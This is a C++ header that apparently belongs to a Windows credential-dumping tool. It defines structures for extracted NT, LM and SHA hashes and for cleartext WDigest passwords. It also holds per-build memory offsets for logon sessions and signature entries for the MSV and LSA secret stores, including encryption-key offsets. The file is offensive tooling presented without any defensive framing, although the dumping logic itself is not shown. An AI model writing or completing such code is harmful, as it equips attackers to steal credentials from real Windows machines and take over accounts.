#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <vector>
#include <string>
#include <optional>
#include <format>
#include <span>
#include <stdexcept>
#include <iostream>
#include <set>

// ----------------------------------------------------------------
// Byte buffer alias
// ----------------------------------------------------------------
using Bytes = std::vector<uint8_t>;

// ----------------------------------------------------------------
// Read helpers (unaligned safe via memcpy)
// ----------------------------------------------------------------
inline uint16_t rw(const uint8_t* d, size_t o) {
    uint16_t v; std::memcpy(&v, d + o, 2); return v;
}
inline uint32_t rd(const uint8_t* d, size_t o) {
    uint32_t v; std::memcpy(&v, d + o, 4); return v;
}
inline int32_t ri(const uint8_t* d, size_t o) {
    int32_t v; std::memcpy(&v, d + o, 4); return v;
}
inline uint64_t rp(const uint8_t* d, size_t o) {
    uint64_t v; std::memcpy(&v, d + o, 8); return v;
}

// ----------------------------------------------------------------
// Credential result
// ----------------------------------------------------------------
struct Credential {
    std::wstring user;
    std::wstring domain;
    std::string  nt_hash;
    std::string  lm_hash;
    std::string  sha_hash;
};

// ----------------------------------------------------------------
// Session struct offsets per build
// ----------------------------------------------------------------
struct SessionOffsets {
    uint32_t luid;
    uint32_t user;
    uint32_t domain;
    uint32_t logon_type;
    uint32_t cred_ptr;
};

inline SessionOffsets session_offsets(uint32_t build) {
    if (build >= 22000) return { 0x70, 0xA0, 0xB0, 0xE8, 0x118 };
    if (build >= 9600)  return { 0x70, 0x90, 0xA0, 0xD0, 0x108 };
    if (build >= 7601)  return { 0x58, 0x78, 0x88, 0xBC, 0xF0  };
    return                     { 0x48, 0x68, 0x78, 0xAC, 0xE0  };
}

// ----------------------------------------------------------------
// MSV signature entry
// ----------------------------------------------------------------
struct MsvSig {
    const uint8_t* pattern;
    size_t         pattern_len;
    int32_t        fe_off;
    int32_t        cnt_off;
    int32_t        corr_off;
    uint32_t       min_build;
};

// ----------------------------------------------------------------
// LSA signature entry
// ----------------------------------------------------------------
struct LsaSig {
    const uint8_t* pattern;
    size_t         pattern_len;
    int32_t        iv_off;
    int32_t        des_off;
    int32_t        aes_off;
    uint32_t       hk_off;
};

// ----------------------------------------------------------------
// WDigest credential
// ----------------------------------------------------------------
struct WDigestCredential {
    std::wstring user;
    std::wstring domain;
    std::wstring password;
};

// ----------------------------------------------------------------
// Hex formatting
// ----------------------------------------------------------------
inline std::string to_hex(std::span<const uint8_t> data) {
    std::string out;
    out.reserve(data.size() * 2);
    for (auto b : data)
        out += std::format("{:02x}", b);
    return out;
}
